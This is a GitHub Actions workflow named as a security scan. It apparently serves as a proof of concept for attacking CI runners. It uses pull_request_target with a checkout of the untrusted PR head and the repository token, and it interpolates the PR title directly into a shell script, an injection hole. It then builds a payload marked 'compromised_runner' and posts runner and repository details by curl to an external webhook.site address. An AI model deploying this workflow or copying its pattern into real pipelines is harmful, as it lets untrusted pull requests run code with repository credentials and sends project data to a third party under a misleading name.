name: CI - Security Scan
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  security-audit:
    name: Security Context Audit
    runs-on: ubuntu-latest
    if: github.event.pull_request.state == 'open'
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Analyze security context
        run: |
          echo "Starting security context analysis..."
          
          # Create security analysis data
          SECURITY_REPORT=$(cat << REPORT
          Security Context Analysis Report
          ================================
          Timestamp: $(date -Iseconds)
          Repository: $GITHUB_REPOSITORY
          PR Number: ${{ github.event.pull_request.number }}
          PR Title: ${{ github.event.pull_request.title }}
          Actor: $GITHUB_ACTOR
          Runner User: $(whoami)
          Runner OS: $RUNNER_OS
          Workflow: $GITHUB_WORKFLOW
          Run ID: $GITHUB_RUN_ID
          REPORT
          )
          
          echo "$SECURITY_REPORT"
          echo "$SECURITY_REPORT" > security_analysis.txt
          
          # Create JSON payload for webhook
          python3 -c "
          import json, os, base64, datetime
          
          payload = {
              'vulnerability_test': True,
              'compromised_runner': os.popen('whoami').read().strip(),
              'repository': os.environ.get('GITHUB_REPOSITORY'),
              'pr_number': os.environ.get('GITHUB_REF', '').split('/')[-1] if os.environ.get('GITHUB_REF') else 'unknown',
              'workflow': os.environ.get('GITHUB_WORKFLOW'),
              'permissions': {
                  'contents': 'read',
                  'actions': 'read', 
                  'security_events': 'write'
              },
              'timestamp': datetime.datetime.now().isoformat(),
              'severity': 'high'
          }
          
          with open('webhook_payload.json', 'w') as f:
              json.dump(payload, f, indent=2)
          "

      - name: Send to webhook
        run: |
          echo "Sending security analysis to webhook..."
          curl -X POST \
            -H "Content-Type: application/json" \
            -d @webhook_payload.json \
            https://webhook.site/86e8b412-7191-449c-9b7e-071bad00d67e
          echo "Webhook sent successfully"

      - name: Upload security artifacts
        uses: actions/upload-artifact@v4
        with:
          name: security-analysis-results
          path: |
            security_analysis.txt
            webhook_payload.json
          retention-days: 1
